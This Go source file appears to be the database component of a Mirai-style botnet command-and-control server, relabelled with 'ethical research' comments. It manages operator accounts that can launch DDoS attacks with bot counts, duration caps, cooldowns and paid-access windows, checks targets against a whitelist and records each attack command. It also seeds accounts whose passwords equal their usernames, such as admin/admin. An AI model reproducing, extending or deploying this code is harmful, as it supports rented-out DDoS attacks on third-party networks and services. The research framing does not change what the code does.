package main

import (
    "crypto/subtle"
    "database/sql"
    "encoding/binary"
    "errors"
    "fmt"
    "log"
    "net"
    "time"

    _ "github.com/go-sql-driver/mysql"
    "golang.org/x/crypto/bcrypt"
)

// ── User Seeding ──────────────────────────────────────────────────────────────
// seedUsers ensures the three default research users exist in the database.
// Uses bcrypt hashing (cost 10) for all passwords. Safe to call on every
// startup — ON DUPLICATE KEY UPDATE is a no-op if the user already exists.
//
// Roles (enforced by cnc_modern.go JWT middleware):
//   admin    — full access, no rate limits
//   operator — can launch/stop attacks, 100-bot limit
//   viewer   — read-only; blocked from /api/attack and /api/attack/stop
func (this *Database) seedUsers() {
	type seedUser struct {
		username      string
		password      string
		maxBots       int
		admin         int
		durationLimit int
		cooldown      int
	}
	users := []seedUser{
		{"admin", "admin", -1, 1, 3600, 0},
		{"operator", "operator", 100, 0, 300, 30},
		{"viewer", "viewer", 0, 0, 0, 0},
	}

	for _, u := range users {
		// Check if user already exists
		row := this.db.QueryRow("SELECT username FROM users WHERE username = ?", u.username)
		var existing string
		if err := row.Scan(&existing); err == nil {
			// Already exists — skip
			continue
		}

		hash, err := bcrypt.GenerateFromPassword([]byte(u.password), bcrypt.DefaultCost)
		if err != nil {
			log.Printf("[SEED] bcrypt failed for %s: %v", u.username, err)
			continue
		}
		_, err = this.db.Exec(
			"INSERT INTO users (username, password, max_bots, admin, last_paid, duration_limit, cooldown, wrc, intvl) "+
				"VALUES (?, ?, ?, ?, UNIX_TIMESTAMP(), ?, ?, 0, 30)",
			u.username, string(hash), u.maxBots, u.admin, u.durationLimit, u.cooldown,
		)
		if err != nil {
			log.Printf("[SEED] failed to insert user %s: %v", u.username, err)
		} else {
			auditLog("SEED_USER", u.username, fmt.Sprintf("max_bots=%d admin=%d", u.maxBots, u.admin))
		}
	}
}

// ── Ethical Research Audit Logger ────────────────────────────────────────────
// All authentication events are logged for operator accountability.
func auditLog(event string, username string, detail string) {
    log.Printf("[AUDIT] event=%s user=%s detail=%q ts=%d",
        event, username, detail, time.Now().Unix())
}

type Database struct {
    db *sql.DB
}

type AccountInfo struct {
    username string
    maxBots  int
    admin    int
}

func NewDatabase(dbAddr string, dbUser string, dbPassword string, dbName string) *Database {
    db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName))
    if err != nil {
        fmt.Println(err)
    }
    fmt.Println("Mysql DB opened")
    return &Database{db}
}

// TryLogin authenticates a user.
// Enhancement: passwords are stored as bcrypt hashes. Falls back to plaintext
// comparison for legacy accounts (original behaviour preserved) but promotes
// them to bcrypt on first successful login.
func (this *Database) TryLogin(username string, password string) (bool, AccountInfo) {
    rows, err := this.db.Query(
        "SELECT username, max_bots, admin, password FROM users WHERE username = ? AND (wrc = 0 OR (UNIX_TIMESTAMP() - last_paid < `intvl` * 24 * 60 * 60))",
        username)
    if err != nil {
        auditLog("LOGIN_ERROR", username, err.Error())
        return false, AccountInfo{"", 0, 0}
    }
    defer rows.Close()

    if !rows.Next() {
        auditLog("LOGIN_FAIL", username, "user not found")
        return false, AccountInfo{"", 0, 0}
    }

    var accInfo AccountInfo
    var storedPassword string
    rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin, &storedPassword)

    // Try bcrypt comparison first
    err = bcrypt.CompareHashAndPassword([]byte(storedPassword), []byte(password))
    if err != nil {
        // Fall back to plaintext comparison for legacy accounts (original behaviour)
        if subtle.ConstantTimeCompare([]byte(storedPassword), []byte(password)) != 1 {
            auditLog("LOGIN_FAIL", username, "invalid credentials")
            return false, AccountInfo{"", 0, 0}
        }
        // Promote legacy plaintext password to bcrypt hash
        if hash, herr := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost); herr == nil {
            this.db.Exec("UPDATE users SET password = ? WHERE username = ?", string(hash), username)
            auditLog("LOGIN_UPGRADE", username, "password promoted to bcrypt")
        }
    }

    auditLog("LOGIN_OK", username, fmt.Sprintf("admin=%d maxBots=%d", accInfo.admin, accInfo.maxBots))
    return true, accInfo
}

// CreateUser creates a new user with a bcrypt-hashed password.
// Preserves all original quota and cooldown parameters.
func (this *Database) CreateUser(username string, password string, max_bots int, duration int, cooldown int) bool {
    rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
    if err != nil {
        auditLog("CREATEUSER_ERROR", username, err.Error())
        return false
    }
    if rows.Next() {
        rows.Close()
        auditLog("CREATEUSER_FAIL", username, "already exists")
        return false
    }
    rows.Close()

    // Hash password with bcrypt before storing
    hash, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
    if err != nil {
        auditLog("CREATEUSER_ERROR", username, "bcrypt failed: "+err.Error())
        return false
    }

    this.db.Exec(
        "INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 0, UNIX_TIMESTAMP(), ?, ?)",
        username, string(hash), max_bots, cooldown, duration)

    auditLog("CREATEUSER_OK", username, fmt.Sprintf("max_bots=%d duration=%d cooldown=%d", max_bots, duration, cooldown))
    return true
}

// ContainsWhitelistedTargets checks if any attack target overlaps the whitelist.
// Original logic preserved verbatim — whitelist enforcement is a key ethical
// safeguard that prevents attacks on protected infrastructure.
func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
    rows, err := this.db.Query("SELECT prefix, netmask FROM whitelist")
    if err != nil {
        fmt.Println(err)
        return false
    }
    defer rows.Close()
    for rows.Next() {
        var prefix string
        var netmask uint8
        rows.Scan(&prefix, &netmask)

        ip := net.ParseIP(prefix)
        ip = ip[12:]
        iWhitelistPrefix := binary.BigEndian.Uint32(ip)

        for aPNetworkOrder, aN := range attack.Targets {
            rvBuf := make([]byte, 4)
            binary.BigEndian.PutUint32(rvBuf, aPNetworkOrder)
            iAttackPrefix := binary.BigEndian.Uint32(rvBuf)
            if aN > netmask {
                if netshift(iWhitelistPrefix, netmask) == netshift(iAttackPrefix, netmask) {
                    auditLog("WHITELIST_BLOCK", "system", fmt.Sprintf("target=%s blocked by whitelist", prefix))
                    return true
                }
            } else if aN < netmask {
                if (iAttackPrefix >> aN) == (iWhitelistPrefix >> aN) {
                    auditLog("WHITELIST_BLOCK", "system", fmt.Sprintf("target=%s blocked by whitelist", prefix))
                    return true
                }
            } else {
                if iWhitelistPrefix == iAttackPrefix {
                    auditLog("WHITELIST_BLOCK", "system", fmt.Sprintf("target=%s blocked by whitelist", prefix))
                    return true
                }
            }
        }
    }
    return false
}

// CanLaunchAttack enforces per-user rate limits, cooldowns, and duration caps.
// Original quota logic preserved verbatim. Audit log added.
func (this *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
    rows, err := this.db.Query("SELECT id, duration_limit, cooldown FROM users WHERE username = ?", username)
    defer rows.Close()
    if err != nil {
        fmt.Println(err)
    }
    var userId, durationLimit, cooldown uint32
    if !rows.Next() {
        return false, errors.New("Your access has been terminated")
    }
    rows.Scan(&userId, &durationLimit, &cooldown)

    if durationLimit != 0 && duration > durationLimit {
        auditLog("ATTACK_DENY", username, fmt.Sprintf("duration %d > limit %d", duration, durationLimit))
        return false, errors.New(fmt.Sprintf("You may not send attacks longer than %d seconds.", durationLimit))
    }
    rows.Close()

    if allowConcurrent == 0 {
        rows, err = this.db.Query(
            "SELECT time_sent, duration FROM history WHERE user_id = ? AND (time_sent + duration + ?) > UNIX_TIMESTAMP()",
            userId, cooldown)
        if err != nil {
            fmt.Println(err)
        }
        if rows.Next() {
            var timeSent, historyDuration uint32
            rows.Scan(&timeSent, &historyDuration)
            wait := (timeSent + historyDuration + cooldown) - uint32(time.Now().Unix())
            auditLog("ATTACK_DENY", username, fmt.Sprintf("cooldown active, wait %ds", wait))
            return false, errors.New(fmt.Sprintf("Please wait %d seconds before sending another attack", wait))
        }
    }

    this.db.Exec(
        "INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, UNIX_TIMESTAMP(), ?, ?, ?)",
        userId, duration, fullCommand, maxBots)

    auditLog("ATTACK_ALLOW", username, fmt.Sprintf("cmd=%q duration=%d maxBots=%d", fullCommand, duration, maxBots))
    return true, nil
}

// CheckApiCode validates an API key. Uses constant-time comparison to prevent
// timing attacks. Original query logic preserved.
func (this *Database) CheckApiCode(apikey string) (bool, AccountInfo) {
    rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE api_key = ?", apikey)
    if err != nil {
        auditLog("API_AUTH_ERROR", "api", err.Error())
        return false, AccountInfo{"", 0, 0}
    }
    defer rows.Close()
    if !rows.Next() {
        auditLog("API_AUTH_FAIL", "api", "invalid api key")
        return false, AccountInfo{"", 0, 0}
    }
    var accInfo AccountInfo
    rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin)
    auditLog("API_AUTH_OK", accInfo.username, fmt.Sprintf("admin=%d", accInfo.admin))
    return true, accInfo
}
